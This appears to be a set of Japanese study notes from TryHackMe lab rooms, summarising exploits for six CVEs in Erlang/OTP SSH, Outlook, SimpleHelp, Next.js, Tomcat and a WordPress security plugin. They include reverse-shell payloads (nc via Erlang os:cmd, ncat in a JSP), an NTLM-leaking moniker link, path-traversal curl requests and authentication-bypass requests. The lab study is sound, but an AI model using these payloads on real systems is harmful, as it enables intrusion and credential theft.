# CVE

## CVE-2025-32433

https://tryhackme.com/room/erlangotpsshcve202532433

https://github.com/ProDefense/CVE-2025-32433/blob/main/CVE-2025-32433.py

- Erlang/OTP SSH
- 修正：OTP-27.3.3, OTP-26.2.5.11, or OTP-25.3.2.20.
- 認証情報不要

上記 URL の PoC は無害なファイルを作るだけ。

```
file:write_file("/lab.txt", <<"pwned">>)
```

os::cmd を使うことで、任意のコードを実行できる。

```
command='os:cmd("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.13.85.243 6666 >/tmp/f").'
```

## CVE-2024-21413（Moniker Link）

https://tryhackme.com/room/monikerlink

https://github.com/CMNatic/CVE-2024-21413

- Outlook の脆弱性で、Windows netNTLMv2 hash を盗む。
- アプリケーションを指定するリンクをモニカーリンクという。
- ユーザーがリンクをクリックしたら、ローカル認証情報が指定した IP に送信される。

```sh
# 通常のモニカーリンクは保護ビューにブロックされる
<p><a href="file://ATTACKER_MACHINE/test">Click me</a></p>

# 「!」文字を入れて、保護ビューをバイパスするリンク
<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
```

## CVE-2024-57727 (SimpleHelp)

https://tryhackme.com/room/simplehelpcve202457727

- SimpleHelp <= v5.5.7
- パストラバーサルの脆弱性
- この他に、CVE-2024-57726、CVE-2024-57728 もある

```sh
git clone https://github.com/imjdl/CVE-2024-57727
cd CVE-2024-57727

# 脆弱性があるかどうか確認
python3 poc.py http://MACHINE_IP
```

Windows 用

```sh
# --path-as-is により、.. が正規化されなくなる
curl --path-as-is http://MACHINE_IP/toolbox-resource/../resource1/../../configuration/serverconfig.xml
```

Linux 用

```sh
# Linuxの場合、resource1 の部分を有効なディレクトリ名にする必要がある
curl --path-as-is http://MACHINE_IP/toolbox-resource/../secmsg/../../configuration/serverconfig.xml
```

secmsg 以外の候補 `alertsdb, backups, branding, history, html, notifications, recordings, remotework, simulations, sslconfig, techprefs, templates, toolbox, toolbox-resources, translations
`

## CVE-2025-29927 (Next.js)

https://tryhackme.com/room/nextjscve202529927

- Next.js < 15.2.3, 14.2.25, 13.5.9, 12.3.5
- ミドルウェアベースの認証バイパスの脆弱性
- HTTP ヘッダーを追加するだけ

```sh
curl -H "x-middleware-subrequest: middleware" http://10.10.234.130:3000/protected
```

## CVE-2024-50379 (Tomcat)

https://tryhackme.com/room/tomcatcve202450379

- Apache Tomcat `11.0.0-M1 ~ 11.0.1`, `10.1.0-M1 ~ 10.1.33`, `9.0.0-M1 ~ 9.0.97`
- Time-of-check-Time-of-use（TOCTOU）脆弱性
- 大文字と小文字を区別しないシステム（Windows, macOS）において、デフォルトサーブレットに書き込み権限がある場合、JSP（Java Server Page）のコンパイル時に TOCTOU 競合状態が発生する。

書き込み権限があるとは、サーバーが PUT や DELETE などの HTTP コマンドを受け入れるように設定されていること。

```xml
<servlet>
  <servlet-name>default</servlet-name>
  <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
  <init-param>
    <param-name>readonly</param-name>
    <param-value>false</param-value>
  </init-param>
</servlet>
```

Linux では、demo.jsp と demo.Jsp は同じディレクトリに共存できるため成立しない。

Windows では、Tomcat は demo.jsp をサーブレットとして、demo.Jsp をテキストファイルとして扱う。

```sh
# これはエラーになる
curl -X PUT -d "test" http://10.10.87.31:8080/demo.jsp

# これはアップロード成功する（通常はテキストファイルとして扱われるので実行はされない）
curl -X PUT -d "test" http://10.10.87.31:8080/demo.Jsp
```

Jsp の PUT と jsp の GET が大量にリクエストされて高負荷になった場合、競合により Jsp がサーブレットとして実行される可能性がある。

```sh
git clone https://github.com/iSee857/CVE-2024-50379-PoC
```

```java
payload_put = "<%@ page import=\"java.io.*\" %><% Runtime.getRuntime().exec(\"cmd /c start ncat -e cmd.exe 10.10.54.182 8888\"); %>"
```

## CVE-2024-10924 (Really Simple Security)

https://tryhackme.com/room/bypassreallysimplesecurity

- WordPress の Really Simple Security プラグインの認証バイパス脆弱性
- 9.0.0 ~ 9.1.1.1
- プラグインの 2 要素認証（2FA）メカニズム用に設定された REST API エンドポイントが標的
- 2FA が有効になっているアカウントにのみ影響する

```python
url = "http://vulnerablewp.thm:8080/?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding"
data = {
    "user_id": int(user_id),  # User ID from the argument
    "login_nonce": "invalid_nonce",  # Arbitrary value
    "redirect_to": "/wp-admin/"  # Target redirection
}

response = requests.post(url, json=data)
```

返ってきた Cookie をブラウザに設定すると、認証済状態になる。
